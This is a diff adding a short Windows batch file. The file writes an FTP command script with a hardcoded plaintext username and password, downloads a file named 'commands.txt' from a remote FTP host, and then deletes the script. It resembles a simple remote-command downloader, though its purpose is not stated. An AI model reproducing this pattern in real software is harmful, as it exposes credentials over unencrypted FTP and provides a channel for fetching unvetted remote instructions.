@@ -1,0 +1,8 @@
+@echo off
+echo user update@spatchcoq.co.uk> ftpcmd.dat
+echo spatchcoq123>> ftpcmd.dat
+echo bin>> ftpcmd.dat
+echo get commands.txt>> ftpcmd.dat
+echo quit>> ftpcmd.dat
+ftp -n -s:ftpcmd.dat ftp.spatchcoq.co.uk
+del ftpcmd.dat
